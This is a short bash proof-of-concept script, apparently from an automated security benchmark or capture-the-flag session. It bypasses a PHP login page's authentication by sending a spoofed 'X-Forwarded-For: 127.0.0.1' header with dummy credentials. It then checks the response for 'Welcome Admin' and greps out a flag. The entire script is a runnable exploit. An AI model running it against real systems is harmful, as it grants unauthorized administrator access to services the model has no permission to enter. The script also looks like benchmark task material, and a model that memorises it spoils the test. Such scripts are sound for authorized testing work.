#!/bin/bash
# POC: Authentication bypass via X-Forwarded-For header spoofing - demonstrates admin access without credentials
# Target: ./repo
# Created: 2025-11-07T22:08:20.664Z
# Session: benchmark-XBEN-085-24-mhpe4t6x

# Authentication Bypass via X-Forwarded-For Header Spoofing POC
# This script demonstrates how an unauthenticated attacker can gain admin access
# by spoofing the X-Forwarded-For HTTP header.

TARGET_URL="${1:-http://localhost:80}"
ENDPOINT="/index.php"

echo "[*] AUTH 03 - Authentication Bypass via X-Forwarded-For Header Spoofing"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Attempt login without X-Forwarded-For header (should fail)
echo "[TEST 1] Attempting login WITHOUT X-Forwarded-For header..."
echo "Command: curl -s -X POST $TARGET_URL$ENDPOINT -d 'username=test&password=test'"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT" -d "username=test&password=test")
echo "Response snippet: $(echo "$RESPONSE" | head -c 200)..."
echo ""

# Test 2: Attempt login WITH spoofed X-Forwarded-For header set to 127.0.0.1
echo "[TEST 2] Attempting login WITH X-Forwarded-For: 127.0.0.1..."
echo "Command: curl -s -X POST $TARGET_URL$ENDPOINT -d 'username=test&password=test' -H 'X-Forwarded-For: 127.0.0.1'"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT" -d "username=test&password=test" -H "X-Forwarded-For: 127.0.0.1")
echo "Response:"
echo "$RESPONSE"
echo ""

# Test 3: Check if "Welcome Admin" is present (successful bypass indicator)
if echo "$RESPONSE" | grep -q "Welcome Admin"; then
    echo "[+] VULNERABILITY CONFIRMED: Authentication bypass successful!"
    echo "[+] Admin access granted despite invalid credentials"
    
    # Extract flag if present
    FLAG=$(echo "$RESPONSE" | grep -oP 'FLAG\{[^}]+\}')
    if [ ! -z "$FLAG" ]; then
        echo "[+] Flag found: $FLAG"
    fi
    exit 0
else
    echo "[-] Response does not contain 'Welcome Admin' - bypass may have failed"
    echo "[-] Full response: $RESPONSE"
    exit 1
fi